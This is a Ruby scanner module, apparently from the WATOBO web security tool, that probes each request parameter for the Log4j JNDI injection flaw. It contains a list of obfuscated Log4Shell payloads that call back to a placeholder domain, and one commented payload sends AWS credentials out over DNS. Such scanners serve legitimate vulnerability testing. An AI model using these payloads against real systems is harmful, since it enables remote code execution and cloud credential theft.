# @private
module Watobo #:nodoc: all
  module Modules
    module Active
      module Java


        class Log4j < Watobo::ActiveCheck

          threat = <<'EOF'
Log4j RCE
EOF

          measure = "All user input should be filtered and/or escaped using a method appropriate for the output context"

          @info.update(
              :check_name => 'Log4j', # name of check which briefly describes functionality, will be used for tree and progress views
              :check_group => AC_GROUP_JAVA,
              :description => "Check for every parameter if log4j is triggered.", # description of checkfunction
              :author => "Andreas Schmidt", # author of check
              :version => "1.0" # check version
          )

          @finding.update(
              :threat => threat, # thread of vulnerability, e.g. loss of information
              :class => "Log4j Injection", # vulnerability class, e.g. Stored XSS, SQL-Injection, ...
              :type => FINDING_TYPE_VULN, # FINDING_TYPE_HINT, FINDING_TYPE_INFO, FINDING_TYPE_VULN
              :rating => VULN_RATING_HIGH,
              :measure => measure
          )

          def initialize(project, prefs = {})
            super(project, prefs)

            # ${jndi:dns://${env:AWS_SESSION_TOKEN }.${env:AWS_ACCESS_KEY_ID}.${env:AWS_SECRET_ACCESS_KEY}.CALLBACK_DOMAIN/PAYLOAD}
            # ${${::-j}${::-n}${::-d}${::-I}:${::-l}${::-d}${::-a}${::-p}://CALLBACK_DOMAIN/PAYLOAD}
            # ${${::-j}${::-n}${::-d}${::-I}:${::-r}${::-m}${::-I}://CALLBACK_DOMAIN/PAYLOAD}
            # ${${::-j}ndi:rmi://CALLBACK_DOMAIN/PAYLOAD}
            collection=<<'EOS'
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://CALLBACK_DOMAIN/PAYLOAD}
${jndi${123%25ff:-}:ldap://CALLBACK_DOMAIN/PAYLOAD}
${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://CALLBACK_DOMAIN/PAYLOAD}
${${lower:${lower:jndi}}:${lower:rmi}://CALLBACK_DOMAIN/PAYLOAD}
${${lower:jndi}:${lower:rmi}://CALLBACK_DOMAIN/PAYLOAD}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://CALLBACK_DOMAIN/PAYLOAD}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://CALLBACK_DOMAIN/PAYLOAD}
${${lower:n}${lower:d}i:${lower:rmi}://CALLBACK_DOMAIN/PAYLOAD}
${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://CALLBACK_DOMAIN/PAYLOAD}
${jnd${123%25ff:-${123%25ff:-i:}}ldap://CALLBACK_DOMAIN/PAYLOAD}
${jndi:ldap://CALLBACK_DOMAIN/PAYLOAD}
${jndi:ldap://127.0.0.1#{\{CALLBACK_DOMAIN}}/{PAYLOAD}}
${jndi:rmi://CALLBACK_DOMAIN}
EOS
            @injections = collection.split
          end


          def generateChecks(chat)
            #
            #  Check GET-Parameters
            #
            begin

              chat.request.parameters.each do |testparm|

                # puts parm
                # puts "#{Module.nesting[0].name}: run check on chat-id (#{chat.id}) with parm (#{parm})"
                @injections.each do |check|

                  parm = testparm.copy
                  checker = proc {
                    test = chat.copyRequest

                    cbsrv = 'log4j' + SecureRandom.hex(3) + '.' + Watobo::Conf::Scanner.dns_sensor
                    if testparm.location.to_s =~ /(url|http_parm|body|cookie)/
                      parm.value = CGI::escape(check.gsub(/CALLBACK_DOMAIN/, cbsrv))
                    else
                      parm.value = check.gsub(/CALLBACK_DOMAIN/, cbsrv)
                    end

                    test.set parm
                    test_request, test_response = doRequest(test)

                    [test_request, test_response]
                  }
                  yield checker
                end
              end
            rescue => bang
              puts bang
              puts bang.backtrace
            end

          end
        end

      end
    end
  end
end
